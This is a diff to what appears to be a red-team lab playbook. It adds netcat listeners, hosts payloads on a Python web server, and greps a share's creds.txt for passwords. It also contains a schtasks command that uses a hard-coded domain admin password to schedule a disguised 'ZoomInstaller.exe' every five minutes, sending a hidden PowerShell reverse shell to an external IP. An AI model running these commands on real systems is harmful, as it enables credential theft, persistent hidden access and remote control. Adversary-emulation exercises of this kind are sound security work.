@@ -12,7 +12,8 @@ Level #1 Steps:
 3. Clone C3X2021Engineering repo
 4. Run a Python HTTP web server hosting payloads in L1/WebShare of C3X2021Engineering repo
 	a. python3 -m http.server --bind 10.0.1.4 8080
-5. Open tabs and start two nc shells
+5. Open tabs and start three nc shells
+        a. nc -nlvp 4444
 	a. nc -nlvp 45252
 	b. nc -nlvp 45253
 ------------------------------------------------------------------------------------------
@@ -75,7 +76,7 @@ rm $env:APPDATA\sales_reports.txt
 
 rm $env:APPDATA\svchost.ps1
 
-gc 'C:\Program Files\MySQL\MySQL Server 5.5\my.ini' | sls "password" ### STOP
+gc '\\vm-win10-1\MyShare\creds.txt' | sls "password"
 
 Start-Process -Cred $(New-Object System.Management.Automation.PSCredential ('C3XDCR\helpdesk-admin', $(ConvertTo-SecureString "Cha0sisaladder" -AsPlainText -Force))) -FilePath C:\Windows\System32\schtasks.exe -ArgumentList "/Create /RU C3XDCR\helpdesk-admin /RP Cha0sisaladder /TN Backups /SC MINUTE /MO 5 /TR `"C:\Users\tturner\AppData\Roaming\ZoomInstaller.exe 191.232.179.179 45253 -e \`"$Env:SystemRoot\sysnative\WindowsPowerShell\v1.0\powershell.exe -exec bypass -noprofile -windowstyle hidden\`"`"" -WorkingDir C:\Windows\System32
 
